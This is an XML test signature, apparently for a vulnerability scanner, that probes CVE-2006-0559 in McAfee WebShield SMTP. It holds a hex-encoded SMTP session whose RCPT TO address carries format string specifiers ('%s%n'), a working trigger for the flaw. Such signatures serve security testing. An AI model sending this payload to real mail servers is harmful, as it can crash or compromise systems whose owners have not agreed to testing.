<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="McAfee WebShield SMTP Bounce Message Format String Vulnerability"/>
    <EngDesc display="true" value="There exists a format string vulnerability in the SMTP virus scanning software, McAfee WebShield SMTP. The vulnerability is caused due to improper sanitation of non-existent domain names when generating a bounce message. An unauthenticated attacker may leverage the vulnerability to inject and execute arbitrary code in the context of the running service, normally System."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
      <item value="Denial_of_Service"/>
    </Intent>
    <Protocol display="true" value="SMTP"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Known_Vendors_Affected display="true">
      <item value="McAfee"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="McAfee_WebShield_SMTP"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="McAfee_WebShield_SMTP_4.5_MR1a"/>
    </Known_Versions_Affected>
    <Credit display="true" value="FSC20060403-15"/>
    <CVEID display="true" value="CVE-2006-0559"/>
    <bugtraqID display="true" value="16742"/>
    <OSVDB display="true" value=""/>
    <Author display="true" value="Mike Davis"/>
    <ID display="true" value="884966eed53df20306177b3d833f531f"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value="true"/>
    <ServerSideAttack display="true" value="false"/>
    <SoftwareRevision display="true" value="2.0"/>
    <Suite display="true" value="Standard"/>
    <RunOnce display="false" value="false"/>
    <Valid_Traffic display="false" value="True"/>
    <AccessVector display="false" value="remote"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value="availability"/>
    <FirstAdded display="false" value="normal"/>
    <LastModified display="false" value="633372621275833750"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value="B"/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value="1"/>
    <Regex display="false" value=""/>
    <Created value="1203389420" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
    <NamedVar name="SMTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
  </Variables>
  <Loops>
    <for index="E">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
    <for index="F">
      <for index="A"/>
      <for index="B"/>
      <for index="C"/>
      <for index="D"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="F" Count="">
    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
        <TCP srcPort="@random(1026,65535)" destPort="$SMTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="48454C4F20667363736C6177656B0D0A4D41494C2046524F4D3A203C746573744066726F6D2E636F6D3E0D0A5243505420544F3A203C616161616161616161616140616161616125732573256E256E256E257325732E636F6D3E0D0A444154410D0A4D6573736167652D49443A203C30303862303163363635356524613235636364633024343630313032306140667363736C6177656B3E0D0A46726F6D3A2022736C6177656B20776172656C697322203C746573744066726F6D2E636F6D3E0D0A546F3A203C616161616161616161616140616161616125732573256E256E256E257325732E636F6D3E0D0A5375626A6563743A2074657374696E670D0A446174653A204672692C2032312041707220323030362031323A31343A3135202D303430300D0A4D494D452D56657273696F6E3A20312E300D0A436F6E74656E742D547970653A206D756C7469706172742F616C7465726E61746976653B0D0A09626F756E646172793D222D2D2D2D3D5F4E657874506172745F3030305F303038385F30314336363533442E3142334346434630220D0A582D5072696F726974793A20330D0A582D4D534D61696C2D5072696F726974793A204E6F726D616C0D0A582D4D61696C65723A204D6963726F736F6674204F75746C6F6F6B204578707265737320362E30302E323930302E323138300D0A582D4D696D654F4C453A2050726F6475636564204279204D6963726F736F6674204D696D654F4C452056362E30302E323930302E323138300D0A0D0A546869732069732061206D756C74692D70617274206D65737361676520696E204D494D4520666F726D61742E0D0A0D0A2D2D2D2D2D2D3D5F4E657874506172745F3030305F303038385F30314336363533442E31423343464346300D0A436F6E74656E742D547970653A20746578742F706C61696E3B0D0A09636861727365743D2269736F2D383835392D31220D0A436F6E74656E742D5472616E736665722D456E636F64696E673A2071756F7465642D7072696E7461626C650D0A0D0A68656C6C6F0D0A2D2D2D2D2D2D3D5F4E657874506172745F3030305F303038385F30314336363533442E31423343464346300D0A436F6E74656E742D547970653A20746578742F68746D6C3B0D0A09636861727365743D2269736F2D383835392D31220D0A436F6E74656E742D5472616E736665722D456E636F64696E673A2071756F7465642D7072696E7461626C650D0A0D0A3C21444F43545950452048544D4C205055424C494320222D2F2F5733432F2F4454442048544D4C20342E30205472616E736974696F6E616C2F2F454E223E0D0A3C48544D4C3E3C484541443E0D0A3C4D45544120687474702D65717569763D3344436F6E74656E742D5479706520636F6E74656E743D334422746578742F68746D6C3B203D0D0A636861727365743D334469736F2D383835392D31223E0D0A3C4D45544120636F6E74656E743D3344224D5348544D4C20362E30302E323930302E3238303222206E616D653D334447454E455241544F523E0D0A3C5354594C453E3C2F5354594C453E0D0A3C2F484541443E0D0A3C424F4459206267436F6C6F723D3344236666666666663E0D0A3C4449563E3C464F4E5420666163653D3344417269616C2073697A653D3344323E68656C6C6F3C2F464F4E543E3C2F4449563E3C2F424F44593E3C2F48544D4C3E0D0A0D0A2D2D2D2D2D2D3D5F4E657874506172745F3030305F303038385F30314336363533442E31423343464346302D2D0D0A0D0A2E0D0A515549540D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="0">
    <Output index="E" Count="">
      <Ethernet srcMac="" destMac="" pktType="0800">
        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="3232302077696E326B73727620576562536869656C6420534D54502056342E35204D523161204E6574776F726B204173736F6369617465732C20496E632E20526561647920617420467269204170722032312031323A31343A313420323030360D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
  <Stateful display="false" value="true"/>
  <DestIPVarName display="false" value="$destIP"/>
</threatSignature>
